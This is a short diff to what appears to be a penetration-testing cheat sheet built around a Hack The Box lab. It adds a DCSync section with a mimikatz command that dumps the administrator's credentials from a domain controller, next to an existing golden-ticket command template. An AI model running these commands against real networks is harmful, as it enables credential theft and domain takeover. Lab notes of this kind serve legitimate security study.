@@ -46,3 +46,11 @@ NTLM:
 
 * mimikatz \# kerberos::golden /domain:/sid: /rc4: /user:
 
+### DCSync
+
+DCSync with mimikatz:
+
+```bash
+lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle
+```
+
